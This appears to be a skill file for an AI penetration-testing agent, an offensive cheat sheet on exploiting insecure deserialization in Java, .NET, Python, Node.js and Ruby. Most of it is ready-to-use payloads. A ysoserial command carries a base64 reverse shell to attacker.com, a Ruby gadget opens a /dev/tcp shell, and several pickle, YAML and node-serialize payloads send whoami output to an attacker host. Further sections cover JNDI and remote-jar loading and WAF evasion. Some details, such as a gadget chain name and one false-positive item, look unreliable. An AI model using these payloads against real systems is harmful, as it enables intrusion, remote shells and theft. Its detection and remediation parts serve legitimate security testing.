---
name: deserialization
description: Insecure deserialization testing covering Java ObjectInputStream, Python pickle, .NET BinaryFormatter, PHP unserialize, Node.js node-serialize, Ruby Marshal, ysoserial gadget chains, and framework-specific POP chains
---

# Insecure Deserialization

Insecure deserialization happens when an application reconstructs an object from untrusted data without sufficient validation, leading to Remote Code Execution (RCE), authentication bypass, or arbitrary file access. Each language/runtime has its own native serialization format and its own exploitation toolkit.

**This is the single most impactful vuln class in 2025-2026 after RCE / SSRF / SQLi.** For PHP, see the dedicated `php` skill — this skill covers Java, .NET, Python, Node.js, and Ruby.

## Attack Surface

**Where deserialization happens**
- HTTP body: JSON/MessagePack/Protobuf with polymorphic types
- HTTP cookies: signed/encrypted but with attacker-controlled payload
- URL parameters: base64-encoded blobs
- File uploads: `.session`, `.cache`, `.dat`, `.bin` files
- Database: stored serialized objects loaded back into memory
- Message queues: Kafka, RabbitMQ, Redis, SQS — message bodies often serialized
- Caches: Redis/Memcached values deserialized on read
- IPC: local sockets with serialized payloads

**Native formats per language**
- Java: `ObjectInputStream.readObject()` (binary), `XMLDecoder`, `XStream`, `SnakeYAML`, `Jackson`, `Kryo`, `Hessian`, `Castor`, `JSON-B`
- .NET: `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `JavaScriptSerializer` (legacy), `Json.NET` with `TypeNameHandling.Auto`
- Python: `pickle`, `cPickle`, `shelve`, `PyYAML` (`yaml.load` without `SafeLoader`), `msgpack` with custom codec
- Node.js: `node-serialize` (uses `node-serialize` or `serialize-javascript` `unserialize`), `js-yaml` with `loadAll`, `lodash` template, `express-session` file store
- Ruby: `Marshal.load`, `YAML.load` (Psych without `safe_load`), `JSON.parse` with `object_class`
- Go: `encoding/gob` (binary), `encoding/json` with custom `UnmarshalJSON` calls into setters, `msgpack`
- PHP: covered in the `php` skill (`unserialize`, `phar://`, JSON with type control)

## Detection

**Java — fingerprinting**
- `ObjectInputStream` magic bytes: `\xac\xed\x00\x05` at the start of a payload
- `XMLDecoder`: `<?xml version="1.0" encoding="UTF-8"?><java version="1.8.0_xxx" class="java.beans.XMLDecoder">`
- `XStream`: `<dynamic-proxy>` and `<string>` tags in XML
- `SnakeYAML`: `!!javax.script.ScriptEngineManager [...]`
- `Jackson`: polymorphic types via `@class` JSON field (`@class: "com.example.Foo"`)
- `FastJson`: `{"@type":"com.example.Foo", ...}`
- `Hessian`: binary, distinct from Java serialization
- Kryo: binary, also distinct

**.NET — fingerprinting**
- `BinaryFormatter`: `AAEAAAD/////` prefix (assembly evidence blob)
- `SoapFormatter`: XML with `<SOAP-ENV:Envelope>`
- `NetDataContractSerializer`: XML with `<DataContract>`

**Python — fingerprinting**
- Pickle: binary, base64-encoded in JSON usually
- Look for `gAS` / `(dp0` / `\x80\x04` prefixes
- `yaml.load()` with non-string tags (`!!python/object:os.system`)

**Node.js — fingerprinting**
- `node-serialize`: payload in cookie/POST contains `{"rce":"_$$ND_FUNC$$_function(){...}"}` after base64 decode
- Express with file-based session store: cookie `connect.sid` containing `s%3A...` URL-encoded JSON

**Ruby — fingerprinting**
- `Marshal`: `\x04\x08` prefix when base64-decoded
- `YAML`: `--- !ruby/object:{}` or `--- !ruby/hash:{}`

## Key Vulnerabilities

### Java — `ObjectInputStream.readObject()`

**RCE via `readObject()` on attacker-controlled bytes:**

1. Generate payload: `java -jar ysoserial-all.jar CommonsCollections6 'curl http://attacker/$(whoami)' > payload.bin`
2. Send payload to vulnerable endpoint
3. RCE on the server

**ysoserial gadget chains** (2014-2022, still very common):
- `CommonsCollections1-7` — Apache Commons Collections (any version pre-2015)
- `CommonsBeanutils1` — Apache Commons BeanUtils
- `Spring1-2` — Spring framework
- `Groovy1` — Groovy runtime
- `Becljdk17*` — JDK 17+ bypasses (newer gadget chains)
- `URLDNS` — no RCE, just DNS — perfect for OOB detection

**RCE steps:**
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# DNS-only check (URLDNS chain)
java -jar ysoserial-all.jar URLDNS http://your-collaborator.burpcollaborator.net

# RCE (CommonsCollections6 is most universal)
java -jar ysoserial-all.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vODA4MCAwPiYx|base64 -d}|{bash,-i}'

# Catch shell: nc -lnvp 8080
```

**Detection without RCE (URLDNS):**
```bash
java -jar ysoserial-all.jar URLDNS http://oast.your-collaborator.net
# Watch the collaborator for DNS hit — confirms deserialization with no risk
```

**Jackson polymorphic deserialization:**
```json
{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
```
**Vulnerable Jackson config:**
```java
ObjectMapper om = new ObjectMapper();
om.enableDefaultTyping();  // <-- vulnerable
om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);  // <-- also vulnerable
```

**FastJson auto-type:**
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker:1099/Exploit","autoCommit":true}
```

**SnakeYAML:**
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/yaml-payload.jar"]
  ]]
]
```

**XStream:**
```xml
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>curl</string><string>http://attacker/</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

### .NET — `BinaryFormatter.Deserialize()`

**RCE via `BinaryFormatter` on attacker bytes (DANGER: pre-.NET 5, default on; .NET 5+ throws but legacy apps still vulnerable):**

```bash
# Generate payload with ysoserial.net
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe" -o raw
```

**Gadget chains (ysoserial.net):**
- `WindowsIdentity` — Windows auth (always present, most reliable)
- `TypeConfuseDelegate` — `System.Workflow.Activities` (older)
- `ObjectDataProvider` — WPF
- `PSObject` — PowerShell automation
- `ClaimsIdentity`, `RolePrincipal` — security primitives

**JSON.NET (`Newtonsoft.Json`):**
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```
Vulnerable when `TypeNameHandling.Auto` or `.Objects` is used.

**`JavaScriptSerializer` (legacy ASP.NET):**
```json
{"__type":"System.Diagnostics.Process","StartInfo":{"FileName":"cmd","Arguments":"/c calc"}}
```

### Python — `pickle.loads()`

**RCE via pickle:**
```python
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker/$(whoami)',))
pickle.dumps(Exploit())  # base64 this and send
```

**PyYAML `yaml.load()` (not `SafeLoader`):**
```yaml
!!python/object/apply:os.system ['curl http://attacker/$(whoami)']
```

**Other Python sinks:**
- `shelve.open()` (uses pickle internally)
- `joblib.load()` (uses pickle)
- `numpy.load()` with `allow_pickle=True`
- `pandas.read_pickle()`
- `torch.load()` (uses pickle)
- `cloudpickle.loads()`
- `dill.loads()`

**Detection:**
- Look for unpickling calls: `pickle.loads`, `cPickle.loads`, `_pickle.loads`
- `find . -name "*.py" | xargs grep -l "pickle\.loads\|yaml\.load(" 2>/dev/null`
- `bandit -i B301,B302,B303,B304,B305,B306,B307` finds pickle/yaml/Marshal deserialization
- `semgrep --config "p/python" --lang python` catches most sinks

### Node.js — `node-serialize` and `js-yaml`

**`node-serialize` (most common RCE vector):**
```javascript
// vulnerable
const express = require('express');
const cookieParser = require('cookie-parser');
const serialize = require('node-serialize');
const app = express();
app.use(cookieParser());
app.get('/profile', (req, res) => {
  const data = serialize.unserialize(req.cookies.profile);
  res.json(data);
});
```
**Exploit (IIFE for immediate execution):**
```json
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('curl http://attacker/$(whoami)',function(e,o){console.log(o);});}()"}
```

**`js-yaml` `load` (deprecated, use `load` not `loadAll`):**
```yaml
!!js/function "function (){ return require('child_process').execSync('id') }"
```

**`lodash` template:**
```javascript
// Vulnerable: `_.template()` with user input
const compiled = _.template(req.body.template)();
```
Exploit: `<%= require('child_process').execSync('id') %>`

**`serialize-javascript` (less common):**
- Has built-in `unsafe` mode to allow functions — confirm it isn't used

### Ruby — `Marshal.load`, `YAML.load`

**`Marshal.load` on attacker bytes:**
```ruby
# Vulnerable
data = Marshal.load(Base64.decode64(params[:data]))
```
**Exploit (using `Gem::Requirement` chain):**
```ruby
# Spawn reverse shell
code = '`bash -i >& /dev/tcp/attacker.com/4444 0>&1`'
payload = "Gem::Requirement\n" +
          "  requirement: !ruby/object:Gem::Dependency\n" +
          "    name: '#{code}'\n" +
          "    requirement_list: !ruby/object:Array\n" +
          "      []\n"
```

**`YAML.load` (without `safe_load`):**
```yaml
--- !ruby/object:Gem::Installer
i: x
requirements:
  - !ruby/object:Gem::Requirement
    name: id
    requirement_list: !ruby/object:Array
      []
```

**Detection:**
- `brakeman -A` (Rails)
- `ruby-audit` (gem audit)
- `semgrep --lang ruby`

## WAF / Filter Bypass

**Java**
- Chain length matching: WAFs check for known class names — use less common chains
- Class name obfuscation: long random package names (`org.apache.commons.collections.functors.InvokerTransformer` can be in custom classpath)
- Lazy class loading: use gadget chains that load classes on demand
- Use `Runtime.exec()` array form: `new String[]{"bash", "-c", "cmd"}` to avoid splitting detection
- Use `ProcessBuilder` with `command(String[])`

**.NET**
- `BinaryFormatter` removed in .NET 9 but legacy apps still vulnerable
- `DataContractSerializer` with known types in WCF configs
- `MessagePack` / `Protobuf.NET` with type names

**Python**
- `__reduce__` alternatives: `__reduce_ex__`, `__getstate__`
- Use `exec` or `eval` if `os.system` is blacklisted
- Use `subprocess.check_output` instead of `os.system`

**Node.js**
- IIFE alternative: `setTimeout(function(){...},0)`, `Promise.resolve().then(()=>{...})`
- `Function` constructor: `(function(){}).constructor("return require('child_process').execSync('id')")()`
- Use `vm.runInNewContext` from a different module path
- Base64 the payload, decode in the IIFE

**Ruby**
- `Gem::Requirement` chain works in most filters
- `Gem::SpecFetcher` chain
- `Psych::DisallowedClass` exception is just a warning, not blocking
- Use `Kernel.open` for file write + `Gem::Requirement` for RCE

## Bypass Techniques

**Encoding/serialization tricks**
- Base64 + URL encode + UTF-8 BOM
- Compress (gzip) the binary payload
- Use `Content-Encoding: gzip` request header
- Hex-encode the JSON `id`/`@class` fields
- Unicode escape `\\u0022` for quote chars

**Classpath manipulation**
- Use common library classes that are always present: `org.apache.commons.*`, `com.sun.*`, `javax.*`
- Chains that work without external dependencies
- JDK 17+ requires newer gadget chains (`becljdk17*`)

**Server-side deserialization**
- Java: `Serializable` interface not required for some chains
- Use `Externalizable` or custom deserializer paths
- `XStream` allows the attacker to specify the class

**Header-aware WAF bypass**
- Send `Content-Type: application/x-www-form-urlencoded` to bypass JSON-only filters
- Use `multipart/form-data` with serialized payload as file
- Use a different content-type the deserializer accepts

## Testing Methodology

1. **Map inputs** — find all serialized blob sources: cookies, headers, body, query params
2. **Fingerprint format** — base64-decode and look for `AC ED 00 05` (Java), `gAS` (Python pickle), `AAEAAAD` (.NET), `04 08` (Ruby Marshal), `s%3A` (Node.js session)
3. **Send innocuous payload** — `serialize.unknownobj=true` — observe error message revealing class names
4. **Test with `URLDNS`** — DNS-only Java chain to confirm blind deserialization
5. **Test with `ysoserial GeneratePayload`** — multiple gadget chains, look for OOB interaction
6. **Test framework-specific** — Jackson `@type`, FastJson `@type`, XStream XML, PyYAML `!!python/object`
7. **Attempt RCE** — only after OOB confirms — start with read-only commands (`id`, `hostname`, `cat /etc/hostname`)
8. **Look for sinks in code** — `grep -rn "readObject\|pickle\.loads\|yaml\.load\|BinaryFormatter\|Marshal\.load\|node-serialize\|unserialize" --include="*.java" --include="*.py" --include="*.js" --include="*.rb" .`

## Validation Requirements

- **RCE chain**: spawn a shell, write a file, exfiltrate `/etc/passwd` or `hostname` content
- **OOB confirmation**: payload reaches the collaborator / interactsh (see `interactsh` skill)
- **Source code sink**: show the exact line that calls `readObject()` / `pickle.loads()` / `BinaryFormatter.Deserialize()` on attacker-controlled input
- **Gadget chain documentation**: which class library, which version, the specific gadget
- **Impact boundary**: confirm process user (root, www-data, app user, etc.) for severity rating
- **Persistence path**: where the payload came from (cookie name, body field, file format) — needed for remediation

## False Positives

- Library signature check enforces that the deserialized class is on an allowlist (e.g., Jackson with `BasicPolymorphicTypeValidator`)
- The blob is HMAC-signed and the key is not derivable from attacker
- The blob is encrypted with a server-side key the attacker cannot obtain
- `enableDefaultTyping()` is NOT called in Jackson (the safe default)
- `yaml.load()` is replaced by `yaml.safe_load()` (safe by default since PyYAML 5.1)
- `pickle.loads()` only on data the server itself wrote (no attacker roundtrip)
- The deserializer is a `RestrictedUnpickler` with a strict allowlist
- `processBuilder.start()` is replaced by `Runtime.exec()` with input validation
- The deserialized object is a DTO/POJO with no methods that get called (`readObject` is benign; exploitation requires `readResolve`/`readObject` gadget chain)

## Impact

- **RCE** at the level of the deserialization process user (often `app`, `www-data`, `nobody`, or `SYSTEM` on Windows services)
- **File read/write** via gadget chains
- **SSRF** via `URL`/`URLConnection` chains
- **Authentication bypass** by deserializing a pre-authenticated session object
- **Privilege escalation** if the deserialization runs in a privileged context (e.g., Jenkins, JMX, admin)
- **Denial of service** via deeply nested collections or self-referential objects

## Cross-References

- **PHP `unserialize()` + `phar://`**: see the `php` skill — distinct language, different gadgets
- **JWT validation bugs**: see `oauth2_oidc` skill — JWT deserialization has its own attack surface
- **SSTI**: see `ssti` skill — template engines can deserialize user input
- **WAF evasion**: see `web_search` + `exploit_search` for current 2025-2026 WAF bypass techniques per gadget
- **Detection**: `interactsh` skill — OOB interaction is the safest way to confirm blind deserialization

## Tooling Checklist

- **ysoserial** (`java -jar ysoserial-all.jar`) — Java gadget chain generator
- **ysoserial.net** (`ysoserial.exe`) — .NET gadget chain generator
- **marshalsec** — Java JSON/YAML/etc. gadget chains (for Jackson, FastJson, XStream, SnakeYAML)
- **ysoserial-modified** — adds JDK 17+ chains
- **pickle-scanner** — find pickle.loads sinks
- **bandit** (`bandit -i B301-B307`) — Python deserialization detectors
- **semgrep** with `p/python`, `p/java`, `p/javascript`, `p/ruby` rules
- **brakeman** — Ruby/Rails static analysis
- **gadgetinspector** — Java gadget chain discovery
- **interactsh-client** — OOB interaction server for blind detection
